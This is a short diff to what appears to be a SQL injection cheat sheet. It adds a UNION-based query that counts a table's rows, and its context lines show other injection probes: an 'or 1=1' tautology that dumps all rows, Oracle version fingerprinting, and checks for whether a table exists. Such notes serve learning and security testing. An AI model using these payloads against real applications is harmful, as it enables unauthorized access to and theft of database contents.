@@ -8,6 +8,8 @@ UNION SELECT banner FROM v$version WHERE rownum=1 (For Oracle)
 
 select * from students where Student_ID = 1 or 1=1;  --> Will give all columns data from the selected table
 
+select * from students where Student_ID = 1 UNION select count(*) from <Table_Name>;  --> Will return the number of rows/records in the table
+
 select * from students where Student_ID = 1 UNION SELECT 1 FROM <TABLE_NAME>;  --> To enumerate if the specified table is present or not 
                                                                                     returns table not exists or SELECT statement have a different number of columns
 
